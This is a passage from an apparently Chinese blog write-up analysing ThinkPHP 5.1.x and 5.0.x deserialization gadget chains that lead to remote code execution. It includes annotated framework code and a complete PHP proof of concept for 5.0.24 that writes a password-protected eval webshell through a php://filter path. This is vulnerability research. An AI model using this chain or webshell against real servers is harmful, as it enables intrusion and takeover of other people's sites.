class="line">$obj-&gt;$func($this,$argv)</span><br></pre></td></tr></table></figure><p>那这里需要知道的是回调函数不光只是简简单单的普通函数</p><p>还可以是对象的方法 包括静态类方法</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779197684-4971d72a-f30b-46a7-8878-ba2e5b952d49.png" alt="img"></p><p>因此这里就可以理解上述中call_user_func_array中第一个参数函数格式为<code>[$obj,&quot;任意方法&quot;]</code>也就是对象的方法</p><p>而参数由于array_unshift函数的缘故第一个为<code>$this</code>也就是一个对象</p><p><code>$obj-&gt;$func($this,$argv)</code>那么直接用这种方式去RCE 很难的拉</p><p>此时就要用到了Request类中一个特殊的功能就是过滤器filter</p><p>并且ThinkPHP中的多个RCE漏洞都是由于这个过滤器</p><p>所以我们可以去尝试覆盖filter方法去RCE</p><p>我们先来看看这个filter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">private function filterValue(&amp;$value, $key, $filters)</span><br><span class="line">    &#123;</span><br><span class="line">        $default = array_pop($filters);</span><br><span class="line"></span><br><span class="line">        foreach ($filters as $filter) &#123;</span><br><span class="line">            if (is_callable($filter)) &#123;</span><br><span class="line">                // 调用函数或者方法过滤</span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125; elseif (is_scalar($value)) &#123;</span><br><span class="line">                if (false !== strpos($filter, &#x27;/&#x27;)) &#123;</span><br><span class="line">                    // 正则过滤</span><br><span class="line">                    if (!preg_match($filter, $value)) &#123;</span><br><span class="line">                        // 匹配不成功返回默认值</span><br><span class="line">                        $value = $default;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; elseif (!empty($filter)) &#123;</span><br><span class="line">                    // filter函数不存在时, 则使用filter_var进行过滤</span><br><span class="line">                    // filter为非整形值时, 调用filter_id取得过滤id</span><br><span class="line">                    $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));</span><br><span class="line">                    if (false === $value) &#123;</span><br><span class="line">                        $value = $default;</span><br><span class="line">                        break;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>该方法调用了<code>call_user_func</code> 但是在这里<code>$value</code>参数不可直接控 </p><p>继续寻找</p><p>发现input函数调用了这个filterValue</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779812219-588beaf8-9bb2-44da-abb7-9c14ed94ec2c.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">public function input($data = [], $name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)</span><br><span class="line">   &#123;</span><br><span class="line">       if (false === $name) &#123;</span><br><span class="line">           // 获取原始数据</span><br><span class="line">           return $data;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $name = (string) $name;</span><br><span class="line">       if (&#x27;&#x27; != $name) &#123;</span><br><span class="line">           // 解析name</span><br><span class="line">           if (strpos($name, &#x27;/&#x27;)) &#123;</span><br><span class="line">               list($name, $type) = explode(&#x27;/&#x27;, $name);</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           $data = $this-&gt;getData($data, $name);</span><br><span class="line"></span><br><span class="line">           if (is_null($data)) &#123;</span><br><span class="line">               return $default;</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           if (is_object($data)) &#123;</span><br><span class="line">               return $data;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       // 解析过滤器</span><br><span class="line">       $filter = $this-&gt;getFilter($filter, $default);</span><br><span class="line"></span><br><span class="line">       if (is_array($data)) &#123;</span><br><span class="line">           array_walk_recursive($data, [$this, &#x27;filterValue&#x27;], $filter);</span><br><span class="line">           if (version_compare(PHP_VERSION, &#x27;7.1.0&#x27;, &#x27;&lt;&#x27;)) &#123;</span><br><span class="line">               // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针</span><br><span class="line">               $this-&gt;arrayReset($data);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125; else &#123;</span><br><span class="line">           $this-&gt;filterValue($data, $name, $filter);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       if (isset($type) &amp;&amp; $data !== $default) &#123;</span><br><span class="line">           // 强制类型转换</span><br><span class="line">           $this-&gt;typeCast($data, $type);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       return $data;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>但是这里参数仍旧不可控 不能直接使用</p><p>那么继续看看谁调用了input 套娃就完事了</p><p>那么这里是找到了param函数 不过参数仍旧不可控</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701779998764-57f74acd-6dab-437f-a507-7a4ffcb6e633.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">public function param($name = &#x27;&#x27;, $default = null, $filter = &#x27;&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!$this-&gt;mergeParam) &#123;</span><br><span class="line">            $method = $this-&gt;method(true);</span><br><span class="line"></span><br><span class="line">            // 自动获取请求变量</span><br><span class="line">            switch ($method) &#123;</span><br><span class="line">                case &#x27;POST&#x27;:</span><br><span class="line">                    $vars = $this-&gt;post(false);</span><br><span class="line">                    break;</span><br><span class="line">                case &#x27;PUT&#x27;:</span><br><span class="line">                case &#x27;DELETE&#x27;:</span><br><span class="line">                case &#x27;PATCH&#x27;:</span><br><span class="line">                    $vars = $this-&gt;put(false);</span><br><span class="line">                    break;</span><br><span class="line">                default:</span><br><span class="line">                    $vars = [];</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            // 当前请求参数和URL地址中的参数合并</span><br><span class="line">            $this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br><span class="line"></span><br><span class="line">            $this-&gt;mergeParam = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if (true === $name) &#123;</span><br><span class="line">            // 获取包含文件上传信息的数组</span><br><span class="line">            $file = $this-&gt;file();</span><br><span class="line">            $data = is_array($file) ? array_merge($this-&gt;param, $file) : $this-&gt;param;</span><br><span class="line"></span><br><span class="line">            return $this-&gt;input($data, &#x27;&#x27;, $default, $filter);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $this-&gt;input($this-&gt;param, $name, $default, $filter);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续寻找谁调用了param</p><p>找到了 isAjax函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701780098519-a4d71b56-0839-4ef4-a226-8d9dcb651cba.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public function isPjax($pjax = false)</span><br><span class="line">   &#123;</span><br><span class="line">       $result = !is_null($this-&gt;server(&#x27;HTTP_X_PJAX&#x27;)) ? true : false;</span><br><span class="line"></span><br><span class="line">       if (true === $pjax) &#123;</span><br><span class="line">           return $result;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $result           = $this-&gt;param($this-&gt;config[&#x27;var_pjax&#x27;]) ? true : $result;</span><br><span class="line">       $this-&gt;mergeParam = false;</span><br><span class="line">       return $result;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>而isAjax函数中 我们可控<code>$this-&gt;config[&#39;var_pjax&#39;]</code></p><p>意味着param函数中<code>$name</code>可控</p><p>意味着input函数中的<code>$name</code>可控</p><p>在这里 以上我们说什么可控 什么不可控应该怎么判断呢 </p><p>可以直接看类属性 类中明确定义了某个属性 那么这个属性我们就可以重写来控制</p><p>而param函数可以获得<code>$_GET</code>数组 并且赋值给<code>$this-&gt;param</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;param = array_merge($this-&gt;param, $this-&gt;get(false), $vars, $this-&gt;route(false));</span><br></pre></td></tr></table></figure><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782687578-16bc813b-9534-49c7-b37d-444a01d9a9b7.png" alt="img"></p><p>跟进input</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781256320-141b25c8-120a-469c-90e9-86989d2047f6.png" alt="img"></p><p>跟进getData</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protected function getData(array $data, $name)</span><br><span class="line">    &#123;</span><br><span class="line">        foreach (explode(&#x27;.&#x27;, $name) as $val) &#123;</span><br><span class="line">            if (isset($data[$val])) &#123;</span><br><span class="line">                $data = $data[$val];</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return $data;</span><br><span class="line">    &#125;</span><br><span class="line">$data=$data[$val]=$data[$name]</span><br></pre></td></tr></table></figure><p>从GET数组中获取键名为Z1d10t的键值</p><p>并且返回值就是我们的命令 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781443982-69813e68-019a-4b4b-bdea-6c6cd5eea7df.png" alt="img"></p><p>接着进入getFilter函数获取filter属性</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781754618-b96d3cc0-7e9d-486f-a068-2c522e2813db.png" alt="img"></p><p>在param函数中filter首先为空 然后在这里用<code>$this-&gt;filter</code>赋值 因此我们可以再poc中重新赋值为system</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781901324-7242fa00-4545-438d-b596-4fafb50146c4.png" alt="img"></p><p>然后在$filter数组追加一个default 值为null 没大用 然后返回</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701781993001-c21d178c-8095-49ed-a55a-173e719c21a3.png" alt="img"></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782003574-6cab6507-0e00-4ccd-8d28-7990359fb177.png" alt="img"></p><p>最后进入filterValue函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782079134-841663cb-5743-4e13-82ea-e6a79e5ab3c4.png" alt="img"></p><p>用array_pop弹出数组末尾的元素 因此只剩下了system</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782149417-fcbf6955-1c8c-488f-ab51-5f4a9dcab3b0.png" alt="img"></p><p>然后再调用call_user_func方法 完成RCE</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701782415565-2b48611f-8f94-40e3-81dc-ec156a1dcb46.png" alt="img"></p><p>ok 让我们再来梳理一下思路 </p><p>这里我们可以从两个方向正向与反向去分析比较清晰 </p><p>正向：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">\thinkphp\library\think\process\pipes\Windows.php - &gt; __destruct()</span><br><span class="line">\thinkphp\library\think\process\pipes\Windows.php - &gt; removeFiles()</span><br><span class="line">Windows.php:file_exists() 由于传入了new Pivot() 将对象当作了字符串处理 触发__toString</span><br><span class="line">由于Pivot类没有__toString 但是他继承了Model类 但是该类也不存在 然而它复用了Conversion类 可以用它的toString</span><br><span class="line">因此到了Conversion类</span><br><span class="line">thinkphp\library\think\model\concern\Conversion.php - &gt; __toString()</span><br><span class="line">__toString中又调用了toJon</span><br><span class="line">thinkphp\library\think\model\concern\Conversion.php - &gt; toJson() </span><br><span class="line">tojson()中又调用了toarray()</span><br><span class="line">toarray中存在调用visible()这个函数 此时思路为如果调用某个对象不存在的函数 那么会触发__call()</span><br><span class="line">并且Conversion类中$this-&gt;data类属性我们可控 getAttr()会获取键为Z1d10t的值 我们给他赋值一个对象Request</span><br><span class="line">因此到了Request类</span><br><span class="line">thinkphp\library\think\Request.php   - &gt; __call()</span><br><span class="line">该call函数中有call_user_func_array是可以执行命令但是 由于arary_unshift函数我们的参数第一个为一个对象因此没法愉快的执行函数</span><br><span class="line">此时正向就先断开了</span><br></pre></td></tr></table></figure><p>反向</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">前面由于参数不理想 我们没法愉快的执行函数 因此我们只好寻找其他方法</span><br><span class="line">那么存在filterValue这个过滤器函数 该函数直接存在call_user_func($filter,$value)</span><br><span class="line">在这里我们$filter是直接可控的 但是呢 $value是不可直接控制的 因此通过链式调用去看看哪个函数可以控制该$value</span><br><span class="line">最后找到input函数中调用了filterValue()</span><br><span class="line">thinkphp\library\think\Request.php - &gt; input()  $data由param()的$param控制 $name由param()的name控制</span><br><span class="line">thinkphp\library\think\Request.php - &gt; param()  $param通过get方式传参可控 $name可控由isAjax()可控</span><br><span class="line">thinkphp\library\think\Request.php - &gt; isAjax() 它传给param()的$this-&gt;config[&#x27;var_ajax&#x27;]是可控的 使得param() $name可控</span><br><span class="line">那么依次是找到了isAjax()-&gt;param()-&gt;input()-&gt;filterValue() （以上过程倒着看）</span><br><span class="line">依次执行函数需要的$value可控了 只需要用正向最后拿到的call_user_func_array()将isAjax()串起来 </span><br><span class="line">那么整条链子就通了</span><br><span class="line">thinkphp\library\think\Request.php - &gt; filterValue()</span><br></pre></td></tr></table></figure><p>偷包浆的图 这个图思路太清晰了</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1677475246895-8468d7ef-81bc-4339-9793-cd52d5c34641.png" alt="img"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>直接把__call()方法砍了 后面的链子也就断掉了</p><h1 id="5-2-x版本分析"><a href="#5-2-x版本分析" class="headerlink" title="5.2.x版本分析"></a>5.2.x版本分析</h1><p>这里官方已经把Thinkphp5.2.x升级为Thinkphp6.0因此没法下载5.2.x的源码包 </p><p>寄 网上找不到相关源码包</p><p>之后在6.x分析再回顾吧</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701853032417-15c295a4-6a2d-4321-9e45-802d2c775af2.png" alt="img"></p><p>可以看这位师傅的<a href="https://xz.aliyun.com/t/6619#toc-1">thinkphp5.1.x~5.2.x版本反序列化链挖掘分析 - 先知社区</a></p><h1 id="5-0-x版本分析"><a href="#5-0-x版本分析" class="headerlink" title="5.0.x版本分析"></a>5.0.x版本分析</h1><h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><ul><li>php7.3.4+Xdebug+thinkphp5.0.24+phpstudy+phpstorm</li></ul><p>和上面一样准备一个二次反序列化入口 替换<code>/application/index/controller/index.php</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701854704626-44a5de6b-09a6-4e37-ad44-b82ebe834d82.png" alt="img"></p><p>poc：（影响版本5.0.24和5.0.18，5.0.9不可用）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">//__destruct</span><br><span class="line">namespace think\process\pipes&#123;</span><br><span class="line">    class Windows&#123;</span><br><span class="line">        private $files=[];</span><br><span class="line"></span><br><span class="line">        public function __construct($pivot)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;files[]=$pivot; //传入Pivot类</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//__toString Model子类</span><br><span class="line">namespace think\model&#123;</span><br><span class="line">    class Pivot&#123;</span><br><span class="line">        protected $parent;</span><br><span class="line">        protected $append = [];</span><br><span class="line">        protected $error;</span><br><span class="line"></span><br><span class="line">        public function __construct($output,$hasone)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;parent=$output; //$this-&gt;parent等于Output类</span><br><span class="line">            $this-&gt;append=[&#x27;a&#x27;=&gt;&#x27;getError&#x27;];</span><br><span class="line">            $this-&gt;error=$hasone;   //$modelRelation=$this-&gt;error</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//getModel</span><br><span class="line">namespace think\db&#123;</span><br><span class="line">    class Query</span><br><span class="line">    &#123;</span><br><span class="line">        protected $model;</span><br><span class="line"></span><br><span class="line">        public function __construct($output)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;model=$output; //get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\console&#123;</span><br><span class="line">    class Output</span><br><span class="line">    &#123;</span><br><span class="line">        private $handle = null;</span><br><span class="line">        protected $styles;</span><br><span class="line">        public function __construct($memcached)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handle=$memcached;</span><br><span class="line">            $this-&gt;styles=[&#x27;getAttr&#x27;];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Relation</span><br><span class="line">namespace think\model\relation&#123;</span><br><span class="line">    class HasOne&#123;</span><br><span class="line">        protected $query;</span><br><span class="line">        protected $selfRelation;</span><br><span class="line">        protected $bindAttr = [];</span><br><span class="line"></span><br><span class="line">        public function __construct($query)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;query=$query; //调用Query类的getModel</span><br><span class="line"></span><br><span class="line">            $this-&gt;selfRelation=false; //满足条件!$modelRelation-&gt;isSelfRelation()</span><br><span class="line">            $this-&gt;bindAttr=[&#x27;a&#x27;=&gt;&#x27;admin&#x27;];  //控制__call的参数$attr</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\session\driver&#123;</span><br><span class="line">    class Memcached&#123;</span><br><span class="line">        protected $handler = null;</span><br><span class="line"></span><br><span class="line">        public function __construct($file)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;handler=$file; //$this-&gt;handler等于File类</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace think\cache\driver&#123;</span><br><span class="line">    class File&#123;</span><br><span class="line">        protected $options = [</span><br><span class="line">            &#x27;path&#x27;=&gt; &#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php&#x27;,</span><br><span class="line">            &#x27;cache_subdir&#x27;=&gt;false,</span><br><span class="line">            &#x27;prefix&#x27;=&gt;&#x27;&#x27;,</span><br><span class="line">            &#x27;data_compress&#x27;=&gt;false</span><br><span class="line">        ];</span><br><span class="line">        protected $tag=true;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">namespace &#123;</span><br><span class="line">    $file=new think\cache\driver\File();</span><br><span class="line">    $memcached=new think\session\driver\Memcached($file);</span><br><span class="line">    $output=new think\console\Output($memcached);</span><br><span class="line">    $query=new think\db\Query($output);</span><br><span class="line">    $hasone=new think\model\relation\HasOne($query);</span><br><span class="line">    $pivot=new think\model\Pivot($output,$hasone);</span><br><span class="line">    $windows=new think\process\pipes\Windows($pivot);</span><br><span class="line"></span><br><span class="line">    echo base64_encode(serialize($windows));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将生成的payload 在首先给input传参 （原谅这里为什么是thinkphp5.1 只要\thinkphp\base.php显示版本是正确的即可）</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855243164-639a1a3d-c7c6-4530-9997-781cc8000fa9.png" alt="img"></p><p>然后访问<code>/public/a.php3b58a9545013e88c7186db11bb158c44.php</code></p><p>密码为ccc 可见是可以打通的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855194658-fff84791-d39a-4d12-a5a0-314b74e7a472.png" alt="img"></p><p>可以看一下我们写马上去的文件内容 可见不是正常的一句话 里面其实还包括了filterchain的知识点</p><p>一句话理解就是利用base64、iconv等编码组合构造出特定的php代码进而完成无需临时文件的RCE 并且可以绕过死亡函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1701855894718-11638ac7-dace-4401-a191-35e6dd8bd4e3.png" alt="img"></p><h2 id="挖掘-1"><a href="#挖掘-1" class="headerlink" title="挖掘"></a>挖掘</h2><p>首先我们的入口点还是Windows.php的析构函数 前面一部分的链子和5.1.x的差不多</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375636049-c3987dc4-2055-40d9-afb2-e19ef408cc37.png" alt="img"></p><p>继续跟进 到了removeFiles() 这里还是一样由于直接把对象当作字符串传入file_exists函数 因此导致会触发<code>__toString()</code> </p><p>但是和5.1.x的链子不同的是5.0.x的model类有<code>__toSting()</code> 因此不需要use 5.1.x的被trait修饰的Converison类用它的<code>__toString()</code></p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375828839-82070bc9-5c06-4c40-b71a-835552d0f7de.png" alt="img"></p><p>继续跟进 到toJson()</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702375862497-c655956d-eb3c-4409-99d4-7eb0b9ea9892.png" alt="img"></p><p>然后进到了toArray()函数</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376002618-a6d2f155-ae7a-4b05-8ba7-71a97e257ebb.png" alt="img"></p><p>这里有四个断点我们需要着重分析</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376154221-3e88dbd1-be05-4e8a-8552-5d5d9e3d7c5e.png" alt="img"></p><p>首先这里<code>$relation</code>是通过<code>parseName</code>方法完成的 顺便提一嘴 这里调用方法方式是通过静态方法调用的</p><p>那这里我们需要知道<code>$name </code>的值是通过遍历<code>$this-&gt;append</code>数组赋值的为getError</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376915350-5f097820-b5a3-413a-b85f-157888ed6d97.png" alt="img"></p><p>那这里有个疑惑就是我们poc中是给Pivot类的<code>$this-&gt;append</code>赋值的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702376975289-22b19a10-94c9-4d5a-b5b1-6fb5d6524397.png" alt="img"></p><p>为什么这里Model直接用呢 因为Model是Pivot的父类 因此父类可以直接调用子类的protected修饰的属性</p><p>ok 我们继续跟进分析一下</p><p>这里<code>type=1</code>进入if语句 直接返回getError</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377084411-7ec81a05-3bb0-49b6-acb3-8fd7b9c99bd6.png" alt="img"></p><p>此时$relation为getError 继续到 <code>method_exists</code>函数 </p><p>Model这个类是有getError函数的</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377185911-2e85ad88-f1ec-4ea5-8aa1-54a915edc50d.png" alt="img"></p><p>因此会进入 这里的error可控 并且我们设置为了HasOne对象 </p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1702377378463-a7d85d0c-8de6-43d0-b817-a926d5b334ee.png" alt="img"></p><p>同样poc中也是可以体现出来的</p><p><img 